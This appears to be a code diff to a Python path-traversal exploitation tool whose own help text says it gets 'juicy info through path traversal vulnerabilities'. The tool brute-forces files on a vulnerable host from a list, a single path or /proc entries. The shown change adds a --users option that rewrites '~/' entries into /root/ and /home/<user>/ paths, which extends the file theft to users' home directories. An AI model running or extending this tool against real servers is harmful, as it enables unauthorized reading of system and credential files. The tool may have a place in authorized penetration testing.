@@ -47,6 +47,7 @@ def parse(container, html):
 			print(soup.get_text(separator="\n"))
 
 def main():
+	pt_list = []
 	parser = argparse.ArgumentParser(description="Get juicy info through path traversal vulnerabilities")
 	group1 = parser.add_mutually_exclusive_group(required=True)
 	parser.add_argument('--base-url',action='store', dest='host',type=str,help='Vulnerable host and path - http://<server>/path.php=',required=True)
@@ -56,7 +57,11 @@ def main():
 	group1.add_argument('--list',action='store', dest='list',type=str,help='File with lists of file to bruteforce')
 	group1.add_argument('--file',action='store', dest='file',type=str,help='Single server file to try to access',default=None)
 	group1.add_argument('--enum-proc',action='store', dest='procs',type=str,help='<start proc#>,<end proc#> : 1,9000',required=False,default=None)
+	parser.add_argument('--users',action='store', dest='users',nargs="+",help='root user1 user2',default='root')
+
 	args = parser.parse_args()
+
+	users_list = args.users
 
 	if args.container is not None:
 		container = args.container.split(",")
@@ -65,7 +70,17 @@ def main():
 		filename = args.list
 		if path.isfile(filename):
 			with open(filename,'r') as file_obj:
-				for line in file_obj:
+				for line in file_obj:		#loads lines into a list
+					if "~/" in line:
+						for user in args.users:
+							temp_line = line
+							if user != "root":
+								pt_list.append(temp_line.replace("~/","/home/"+user+"/"))
+							elif user == "root":
+								pt_list.append(temp_line.replace("~/","/root/"))
+					else:
+						pt_list.append(line)
+				for line in pt_list:
 					try:
 						html = get_request(args.path+line.rstrip(),args.host)
 						if html:
